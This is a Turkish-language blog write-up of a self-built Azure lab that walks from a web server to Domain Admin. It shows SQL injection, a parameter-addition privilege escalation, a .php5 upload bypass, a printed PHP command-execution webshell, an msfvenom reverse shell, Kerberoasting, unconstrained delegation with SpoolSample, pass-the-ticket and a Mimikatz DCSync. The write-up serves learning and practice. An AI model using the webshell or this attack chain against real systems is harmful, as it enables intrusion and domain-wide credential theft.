# Full Red Teaming Senaryo: Web'den Active Directory'ye

Herkese selamlar. Bu yazımda, Microsoft Azure üzerinde kurduğum ve bir web sunucusundan başlayarak Active Directory içerisinde Domain Admin haklarına eriştiğim, kendi oluşturduğum laboratuvar ortamının çözüm yollarını ve öğrendiklerimi kendi üslubumla anlatıyor olacağım. (IP üzerinde deneme yapmayın sunucuyu kapattım :) İyi okumalar..

![Web to AD Full PWN](/blogs/img/web-to-ad-red-teaming/redteam-1.png)

---

## İlk Keşif

Her şey, elime geçen tek bir IP adresiyle başladı: **20.199.67.22**

İlk iş olarak standart bir nmap taraması yaptım ama hedef kapalı gibi görünüyordu.

![Normal Nmap Scan](/blogs/img/web-to-ad-red-teaming/redteam-2.png)

Bu, bulut ortamlarında güvenlik duvarlarının (NSG) ICMP (ping) isteklerini engellemesinden kaynaklanan yaygın bir durum.

`-Pn` parametresiyle ping kontrolünü atlayarak taramayı tekrarladığımda, hedefin aslında ayakta olduğunu ve top 1000 port arasından **445 (SMB)** ile **3389 (RDP)** portlarının açık olduğunu gördüm.

![Nmap Scan with -Pn](/blogs/img/web-to-ad-red-teaming/redteam-3.png)

`-p-` parametresiyle yaptığım tam tarama, **59043** portunda bilinmeyen bir servisin daha çalıştığını ortaya çıkardı.

![Nmap Full Port Scan](/blogs/img/web-to-ad-red-teaming/redteam-4.png)

`curl` ile bu porta istek attığımda "403 Forbidden" hatası aldım, bu da dizin listelemenin kapalı olduğu ama portta bir web sunucusunun çalıştığı anlamına geliyordu.

![Curl Command](/blogs/img/web-to-ad-red-teaming/redteam-5.png)

---

## Web Enumeration

`dirb` aracıyla yaptığım dizin taramasında, `-X` parametresiyle php uzantılarını taramama dahil ettim ve sonrasında `-w` parametresiyle uyarıları atlayarak taramaya devam ettiğimde **login.php** adında bir giriş sayfası buldum.

![Dirb Scan](/blogs/img/web-to-ad-red-teaming/redteam-6.png)

![Index.php](/blogs/img/web-to-ad-red-teaming/redteam-7.png)

Index sayfamız bu şekilde ve bir C2 sunucusuna ait olduğu belli oluyor. (senaryo :)

---

## SQL Injection

Giriş sayfasında, username parametresine tek tırnak (`'`) gönderdiğimde bir SQL hatası aldım. Bu, **Error-Based SQL Injection** zafiyetinin varlığına işaret ediyordu.

![SQL Syntax Error](/blogs/img/web-to-ad-red-teaming/redteam-8.png)

**Error-based SQL injection**, saldırganın SQL sorgularına hata üreten kod ekleyerek uygulamanın döndürdüğü veritabanı hata mesajlarından doğrudan veri veya şema bilgisi çıkarabildiği bir saldırı tekniğidir.

`sqlmap` kullanarak, `-p username` parametresiyle bu zafiyeti sömürdüm. Amacım bir kullanıcı hesabı ele geçirmekti.

![SQLMap Command](/blogs/img/web-to-ad-red-teaming/redteam-9.png)

`karakutu_portal` veritabanındaki `users` tablosundan kullanıcı hesaplarının tablosunu çektim. İki kullanıcı vardı ve ikisi de admin haklarına sahip değildi.

![Database Users Table](/blogs/img/web-to-ad-red-teaming/redteam-10.png)

Ama ilk girişi elde ettim.

![Initial Access](/blogs/img/web-to-ad-red-teaming/redteam-11.png)

---

## Privilege Escalation: Parameter Addition

İçeri girdikten sonraki hedefim yetki yükseltmekti. Profil ayarları sayfasında (`account_settings.php`), giden POST isteğini Burp Suite ile yakaladım.

![Update Profile Request](/blogs/img/web-to-ad-red-teaming/redteam-12.png)

Formda görünmeyen ancak arka planda işlenen bir parametre olabileceğini düşündüm ve isteğe manuel olarak `role=admin` parametresini ekledim.

**Parameter Addition** zafiyeti, uygulama gelen URL/POST parametrelerini doğru şekilde doğrulamaz veya filtrelemezse saldırganın örn. `?role=admin` gibi ek parametreler göndererek yetki yükseltmesi veya hassas işlemleri tetiklemesine olanak veren güvenlik açığıdır.

![We Are Admin](/blogs/img/web-to-ad-red-teaming/redteam-13.png)

Bu "Parameter Addition" saldırısı başarılı oldu ve yetkim "ADMIN" olarak güncellendi. Bu hesapla tekrar giriş yaptım ve `admin_panel.php` sayfası ile karşılaştım.

![Admin Panel](/blogs/img/web-to-ad-red-teaming/redteam-14.png)

---

## File Upload Vulnerability

Bir file upload özelliği var ve hemen php web shell almayı denedim. Ve basit bir php webshell dosyası hazırladım. Uzantısını da `.php` olarak düzenledim.

**Dosya yükleme zafiyeti**, uygulama yüklenen dosyaları yeterince doğrulamaz veya çalıştırma kontrolleri uygulamazsa saldırganın kötü amaçlı bir betik (webshell) yükleyip sunucu üzerinde uzaktan komut çalıştırmasına olanak tanır.

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

![Error on .php Extension](/blogs/img/web-to-ad-red-teaming/redteam-15.png)

Dosya yüklerken `.php` uzantısını kabul etmediğine dair bir hata aldım. Ama aynı dosya yükleme bölümü `.php5` uzantısını kabul etti. Ve php webshell dosyamı hedefe yüklemeyi başarabildim.

![Success with .php5](/blogs/img/web-to-ad-red-teaming/redteam-16.png)

---

## Reverse Shell

Webshell'ler stabil değildir. Bu yüzden, `msfvenom` ile `windows/x64/shell_reverse_tcp` payload'unu kullanarak bir `revshell.exe` dosyası oluşturdum.

**Reverse shell** tekniği, hedef sistemdeki açıklık sayesinde saldırganın hedeften kendi kontrolündeki bir makinaya ters bağlantı açtırıp uzaktan komut çalıştırmasına olanak tanıyan güvenlik açığıdır.

![MSFVenom](/blogs/img/web-to-ad-red-teaming/redteam-17.png)

Sonrasında bu `revshell.exe` dosyasını karşı tarafa aynı upload özelliği ile yükledim ve çalıştırdım. Tabiki aynı anda kendi VPS'im üzerinde 5555 portunu dinlemeye almıştım.

![PHP Webshell](/blogs/img/web-to-ad-red-teaming/redteam-18.png)

![Getting Reverse Shell](/blogs/img/web-to-ad-red-teaming/redteam-19.png)

**Initial Access** adımı tamamlanmış oldu ve içeriye giriş sağlayabildim. Ama çok düşük bir yetkiye sahibiz.

---

## Active Directory Enumeration

İçine girmiş olduğum makinenin AD (Active Directory) yapısına dahil olan bir web server olduğunu tespit ettim. Bundan dolayı AD ortamı hakkında bilgi toplamak için recon adımlarına başladım.

Powershell üzerinden bir takım bilgiler topladım. Ama daha kapsamlı bilgi toplamak için içeriye bir ajan olarak görev yapacak olan **SharpHound** aracını gönderdim ve çalıştırdım.

**BloodHound ve SharpHound**, Active Directory ortamlarında SharpHound ile kullanıcı, grup, oturumlar, ACL ve ilişkisel verileri toplayıp BloodHound'ta grafik tabanlı olarak görselleştirip analiz ederek potansiyel hak yükseltme yollarını ve güvenlik zayıflıklarını ortaya çıkarır.

![SharpHound Execution](/blogs/img/web-to-ad-red-teaming/redteam-20.png)

SharpHound aracı ile zip formatında output aldım. Uploads klasörünün altında olduğumuzdan kolaylıkla ajanımın topladığı bilgileri local'ime çekebildim. Ve bu verileri BloodHound ile analiz ettim.

![All Kerberoastable Users](/blogs/img/web-to-ad-red-teaming/redteam-21.png)

Topladığım verileri BloodHound'da analiz ettiğimde, `svc_mssql` ve diğer 5 hesabın **Kerberoastable** olduğunu gördüm. Aynı zamanda beni domain admin yapacak en kısa yolu da görmüş oldum.

![Shortest Path to Domain Admin](/blogs/img/web-to-ad-red-teaming/redteam-22.png)

Diğer zafiyetleri de aynı şekilde bir takım LDAP sorgularıyla keşfettim.

![Kerberoastable Users with Admin Privileges](/blogs/img/web-to-ad-red-teaming/redteam-23.png)

---

## Kerberoasting Attack

Bu andan sonra hedefim `svc_mssql` kullanıcısı oldu. Aynı uploads dizinine bana lazım olacak araçları yükledim. Ve **Rubeus** aracı ile `svc_mssql` kullanıcısına kerberoasting saldırısı gerçekleştirdim. Ve hash bilgisini ele geçirdim.

**Kerberoasting**, Active Directory'de SPN (Service Principal Name) atanmış hizmet hesapları için talep edilen Kerberos servis biletlerinin (TGS) ele geçirilip içlerindeki şifrelenmiş doğrulama verilerinin çevrimdışı kırılarak zayıf hizmet parolalarının elde edilmeye çalışılmasıdır.

![Kerberoasting Attack](/blogs/img/web-to-ad-red-teaming/redteam-24.png)

Elimdeki kullanıcı hash'ini offline ortamda kali makinemde `hashcat` aracı ile kırmayı denedim. Ve parolasının **Database99** olduğunu buldum.

![Cracking Hash with Hashcat](/blogs/img/web-to-ad-red-teaming/redteam-25.png)

Artık `psexec` aracı veya rdp sunucusu açık olduğu için rdp üzerinden de bu web server'a yani WEB01 sunucusuna erişebilir hale geldim. Artık WEB01'in tam kontrolü bana ait.

---

## Unconstrained Delegation

BloodHound üzerinde analiz ettiğim diğer zafiyetler **Unconstrained Delegation** ve **DCSync** zafiyetleriydi. Bu zafiyetleri kullanarak Domain Admin olabileceğim.

Sonraki adım, WEB01 üzerindeki Unconstrained Delegation zafiyetini sömürmekti. Bir terminalde Rubeus monitor ile dinlemeye başladım ve diğerinde SpoolSample ile DC01'i WEB01'e kimlik doğrulamaya zorladım. Bu sayede DC01'in bilgisayar hesabına ait TGT biletini ele geçirdim.

**Unconstrained delegation**, bir hizmet hesabına kullanıcılardan alınan Kerberos TGT'lerinin yönlendirilmesine izin verildiğinde, saldırganın bu hizmeti kötüye kullanarak kullanıcıların kimlik bilgilerini ele geçirip onların adına Active Directory içinde tam yetkiyle hareket edebilmesine olanak veren zafiyettir.

![Rubeus Monitor Mode](/blogs/img/web-to-ad-red-teaming/redteam-26.png)

Diğer powershell sekmesinde SpoolSample ile DC01'i WEB01'e kimlik doğrulamaya zorladım.

![SpoolSample Attack](/blogs/img/web-to-ad-red-teaming/redteam-27.png)

Bu sayede DC01'in bilgisayar hesabına ait TGT biletini ele geçirdim.

![WEB01 Captured DC01's TGT](/blogs/img/web-to-ad-red-teaming/redteam-28.png)

---

## Pass-the-Ticket

Rubeus ptt komutuyla bu bileti kendi oturumuma enjekte ettim (Pass-the-Ticket). Artık Domain Controller yetkilerine sahibim.

**Pass-the-ticket** zafiyeti, saldırganın çalıntı Kerberos biletlerini (TGT/TGS vb.) kullanarak hedef hesabın parolasını bilmeden onun adına kimlik doğrulaması yapıp kaynaklara erişim sağlayabilmesine olan açıklıktır.

![Pass the Ticket Attack](/blogs/img/web-to-ad-red-teaming/redteam-29.png)

Sonrasında `klist` komutunun çıktısıyla PTT saldırısının gerçekleştiğini doğruladım. Bundan sonra bu ticket ile AD ortamı üzerinde istediğim şeyi yapabilir hale geldim.

---

## DCSync Attack

**DCSync** zafiyeti, Active Directory'de yeterli çoğaltma/replication yetkisine sahip bir kullanıcının kendisini sahte bir domain controller gibi gösterip gerçek DC'lerden kullanıcı parolalarının özetlerini (hash'lerini) ve diğer kimlik bilgilerini senkronizasyon yoluyla çekmesine imkan veren saldırıdır.

![Root123 Pwned](/blogs/img/web-to-ad-red-teaming/redteam-30.png)

Mimikatz'in dcsync özelliğini kullanarak `krbtgt` hesabının hash'i dahil tüm domain hash'lerini çektim ve operasyonu tamamladım.

![KRBTGT Pwned](/blogs/img/web-to-ad-red-teaming/redteam-31.png)

---

## Sonuç

Bu laboratuvar ortamı, tek bir web zafiyetinden başlayarak tüm bir Active Directory domain'inin nasıl ele geçirilebileceğini gösteren, baştan sona son derece öğretici bir serüven oldu. (C2 sunucusunu ele geçirmeyi başardık :)

Sonuna kadar okumayı başarabildiyseniz tebrik ederim :) Umarım faydalı olmuştur. Aklınıza takılan herhangi bir kısım olduysa bana medium'dan veya LinkedIn profilimden ulaşabilirsiniz. Teşekkürler.

---
